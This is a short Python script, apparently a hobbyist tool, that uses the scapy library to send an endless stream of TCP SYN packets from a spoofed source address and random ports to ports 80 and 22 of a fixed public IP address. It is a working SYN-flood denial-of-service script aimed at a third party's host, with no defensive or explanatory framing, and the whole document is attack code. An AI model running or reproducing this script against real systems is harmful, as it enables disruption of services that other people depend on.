from scapy.all import *
from time import sleep

src_ip = "192.168.56.10"
target_ip = "172.217.0.238"
interval = 0.5

network_layer = IP(dst = target_ip, src = src_ip)

while(True):
    port = RandShort()
    transport_layer = TCP(sport = port, dport=[80, 22], flags = "S")
    print "Sending shit ton of SYN to " + target_ip
    send(network_layer/transport_layer, verbose=False)
    print "Done sending"
    sleep(interval)
